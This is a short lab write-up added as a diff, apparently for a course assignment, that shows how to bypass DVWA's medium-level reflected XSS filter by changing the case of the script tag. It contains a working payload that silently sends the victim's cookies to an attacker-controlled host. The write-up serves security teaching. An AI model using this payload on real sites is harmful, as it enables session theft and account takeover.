@@ -1,0 +1,17 @@
+Upon inspection of the DVWA MEDIUM source code, we see this key bit of information:
+
+
+ echo '<pre>';
+ echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
+ echo '</pre>'; 
+
+ Since this only strips the exact match of '<script>' (all lowercase) we can bypass this by using mixed or full uppercase (eg. '<scRiPt>', '<SCRIPT>')
+
+
+Therefore the payload below will work.
+
+<SCRIPT>new Image().src = 'http://10.0.2.15:1337/csci369task2?cookie=' + document.cookie;</SCRIPT>
+
+
+
+new Image().src is used to silently make the request, avoiding alert dialogs.
